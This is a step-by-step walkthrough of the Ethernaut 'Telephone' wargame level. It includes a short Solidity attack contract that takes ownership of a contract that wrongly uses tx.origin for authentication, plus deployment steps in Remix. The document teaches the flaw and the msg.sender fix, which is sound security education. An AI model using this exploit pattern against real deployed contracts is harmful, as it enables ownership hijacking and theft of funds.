---
title: "Telephone – Level 4 Walkthrough"
summary: "Step-by-step walkthrough for the Telephone Ethernaut level. Learn to exploit tx.origin misuse in smart contract access control and become the contract owner."
date: "Jun 26 2025"
tags:
- Ethereum
- Smart Contracts
- Security
- Ethernaut
- Walkthrough
---

# Telephone – Level 4 Walkthrough

Welcome to the **Telephone** level of the [**Ethernaut**](https://ethernaut.openzeppelin.com/) wargame by OpenZeppelin, focused on understanding **`tx.origin` misuse** in access control.

---

## Challenge Objective

You are given a contract with an ownership change function that improperly uses `tx.origin` for authentication. Your goal is to:

- Exploit the contract's flawed use of `tx.origin`
- Become the new `owner` of the contract
- Submit the instance to complete the level

---

## Prerequisites

Before you begin, ensure the following:

- **MetaMask** is installed and connected to the same testnet
- You have test ETH (e.g., on Sepolia or Goerli)
- Familiarity with **Remix IDE**, MetaMask, and browser DevTools
- Access to the [Ethernaut Game](https://ethernaut.openzeppelin.com/)

---

## Getting Started

### 1. Load the Level

- Navigate to [ethernaut.openzeppelin.com](https://ethernaut.openzeppelin.com/)
- Select **“Telephone”** from the level list
- Click **"Get new instance"**
- Approve the MetaMask transaction

Once deployed, a `contract` object is available in the browser DevTools console.

---

## Vulnerability Background

The Telephone contract uses `tx.origin` instead of `msg.sender` in its `changeOwner()` function:

```solidity
function changeOwner(address _owner) public {
    if (tx.origin != msg.sender) {
        owner = _owner;
    }
}
```

This logic **prevents direct calls** from the EOA (your wallet), because in such a case `tx.origin == msg.sender`.

But if we call this function **via another contract**, then `msg.sender` will be the intermediate contract, and `tx.origin` will be your wallet — thus satisfying the condition.

---

## Walkthrough – Step by Step

### Step 1: Write the Exploit Contract

Open [Remix IDE](https://remix.ethereum.org/) and create a new file: `TelephoneAttack.sol`

Paste this code:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface ITelephone {
    function changeOwner(address _owner) external;
}

contract TelephoneAttack {
    function attack(address target) public {
        ITelephone(target).changeOwner(msg.sender);
    }
}
```

This contract:

- Calls `changeOwner()` on the vulnerable contract
- Since this is a contract call, `msg.sender ≠ tx.origin` in the target function
- `msg.sender = this contract`, `tx.origin = your wallet`, so it passes the check

---

### Step 2: Compile and Deploy the Attack Contract

1. Go to the **Solidity Compiler** tab
2. Select **version 0.8.x**
3. Click **Compile TelephoneAttack.sol**

Then:

1. Go to the **Deploy & Run Transactions** tab
2. Set **Environment** to `Injected Provider - MetaMask`
3. Make sure the correct wallet/network is selected
4. Click **Deploy** (no constructor args needed)

---

### Step 3: Execute the Attack

1. Expand your deployed contract in Remix
2. In the `attack()` input box, paste your **Telephone contract instance address** (from the console: `contract.address`)
3. Click **attack()**
4. Confirm transaction in MetaMask

---

### Step 4: Confirm Ownership

Back in the Ethernaut console:

```js
await contract.owner()
```

It should now return **your address**.

---

### Step 5: Submit the Level

Click **Submit Instance** in the Ethernaut UI and confirm in MetaMask.

🎉 Done! You've completed the Telephone level.

---

## 💡 What You Learn

- `tx.origin` is dangerous for access control
- Difference between `msg.sender` and `tx.origin`
- Why authentication should rely on `msg.sender`
- How to craft simple exploit contracts

---

## Concepts Covered

| Concept                     | Description                                                                  |
| --------------------------- | ---------------------------------------------------------------------------- |
| `tx.origin` vs `msg.sender` | `tx.origin` is always the original EOA; `msg.sender` is the immediate caller |
| Access control              | Proper ownership checks must use `msg.sender`                                |
| Contract interaction        | Using contracts to spoof call context                                        |
| Interface injection         | Calling external contracts via interfaces                                    |

---

## Resources

- [Ethernaut Game](https://ethernaut.openzeppelin.com/)
- [Solidity Docs – `tx.origin`](https://docs.soliditylang.org/en/latest/security-considerations.html#tx-origin)
---